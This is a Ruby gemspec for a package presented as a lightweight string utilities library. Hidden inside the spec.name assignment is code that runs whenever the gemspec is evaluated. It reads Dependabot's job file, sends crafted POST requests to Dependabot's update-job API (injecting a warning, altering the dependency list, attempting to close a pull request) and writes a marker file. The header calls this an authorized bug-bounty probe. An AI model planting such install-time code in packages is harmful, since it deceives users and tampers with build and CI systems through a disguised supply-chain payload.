# frozen_string_literal: true
#
# v1.8 boundary-verification probe — content-injection attacker-control audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; own-tenant test
# (mr-benty supply-chain → dep-test-victim-mb consumer) — same setup as
# F011's headline cross-tenant exemplar.
#
# Scope: audit attacker-control over the body fields of three orchestration
# endpoints, beyond the auth-gate confirmation already established by
# HYP-F011-A T2-T6 (run 25618556034). Source review of
# dependabot-core/updater/lib/dependabot/api_client.rb confirmed:
#
#   - create_pull_request body: dependencies + updated-dependency-files +
#     base-commit-sha + commit-message + pr-title + pr-body
#   - update_pull_request body: same shape, modifies existing PR
#   - update_dependency_list body: dependencies array + dependency_files
#   - record_update_job_warning body: warn-type + warn-title + warn-description
#   - close_pull_request body: dependency-names + reason
#
# All these fields are arbitrary strings/objects shaped by the runner. With
# captured token replay, attacker controls all of them.
#
# Three targeted probes (low side-effect, high evidence value):
#
#   T7: record_update_job_warning with PROBE-MARK-prefixed warn-title /
#       warn-description. Verifies attacker-controlled UI strings land on
#       the job record. Visible to victim via Dependabot Insights UI.
#       Side-effect: warning record created on the job (cosmetic, cleanable).
#
#   T8: update_dependency_list with crafted dependencies array containing
#       PROBE-MARK-named entry. Verifies body-validation passes post-auth
#       (the 500 from empty body in T2 indicated server expected a list).
#       Side-effect: in-flight job's dep list mutated; overwritten by
#       Dependabot's own subsequent legitimate call.
#
#   T9: close_pull_request with PROBE-MARK reason. Verifies body validation
#       passes. Side-effect: would close a PR if one exists with our names —
#       we send dep names that don't exist, so no actual closure.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      results = []

      job_id = nil
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        job_id = parsed.dig("job", "id") || parsed["id"]
      rescue
      end
      job_id ||= ENV["DEPENDABOT_JOB_ID"]

      results << "jobid-#{job_id ? job_id.to_s[0, 12] : 'nil'}"

      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"

      probe_mark = "PROBE-MARK-HYP-F011-A-content-audit"

      # T7: record_update_job_warning with attacker-controlled UI strings
      if job_id
        begin
          uri = URI("#{api_url}/update_jobs/#{job_id}/record_update_job_warning")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = {
            data: {
              "warn-type": "probe-attacker-controlled-warn-type",
              "warn-title": "#{probe_mark}-T7-attacker-controlled-warn-title",
              "warn-description": "#{probe_mark}-T7-attacker-controlled-description-content-injection-via-Defect-I-replay"
            }
          }.to_json
          rsp = h.request(req)
          body_len = rsp.body.to_s.length
          results << "T7-warning-s#{rsp.code}-l#{body_len}"
        rescue => e
          results << "T7-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
        end
      end

      # T8: update_dependency_list with crafted single-dep entry
      if job_id
        begin
          uri = URI("#{api_url}/update_jobs/#{job_id}/update_dependency_list")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = {
            data: {
              dependencies: [
                {
                  name: "#{probe_mark}-T8-attacker-controlled-dep-name",
                  version: "1.2.3",
                  requirements: []
                }
              ],
              dependency_files: ["Gemfile", "Gemfile.lock"]
            }
          }.to_json
          rsp = h.request(req)
          body_len = rsp.body.to_s.length
          results << "T8-deplist-s#{rsp.code}-l#{body_len}"
        rescue => e
          results << "T8-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
        end
      end

      # T9: close_pull_request with non-matching dep-names + crafted reason
      # (No PR exists with our PROBE-MARK names, so no actual closure happens.)
      if job_id
        begin
          uri = URI("#{api_url}/update_jobs/#{job_id}/close_pull_request")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Post.new(uri.request_uri)
          req["Content-Type"] = "application/json"
          req.body = {
            data: {
              "dependency-names": ["#{probe_mark}-T9-nonexistent-name"],
              reason: "#{probe_mark}-T9-attacker-controlled-close-reason"
            }
          }.to_json
          rsp = h.request(req)
          body_len = rsp.body.to_s.length
          results << "T9-close-s#{rsp.code}-l#{body_len}"
        rescue => e
          results << "T9-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
        end
      end

      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

      begin
        File.open("/home/dependabot/HYP-F011-A-content-audit-MARKER.txt", "w") do |f|
          f.puts probe_mark
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
